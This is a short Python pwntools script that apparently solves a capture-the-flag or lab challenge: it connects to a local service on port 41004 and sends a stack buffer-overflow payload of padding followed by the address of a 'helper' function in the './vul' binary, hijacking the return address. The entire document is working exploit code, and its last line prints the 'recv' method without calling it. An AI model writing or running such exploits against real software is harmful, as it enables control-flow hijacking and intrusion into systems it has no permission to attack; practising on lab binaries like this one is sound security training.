from pwn import *

context.log_level = 'debug'

p = remote('localhost', 41004)
file = ELF("./vul")
payload = b'A'*512 + b'B'*8 + p64(file.symbols["helper"])

p.sendline(payload)
print(p.recv)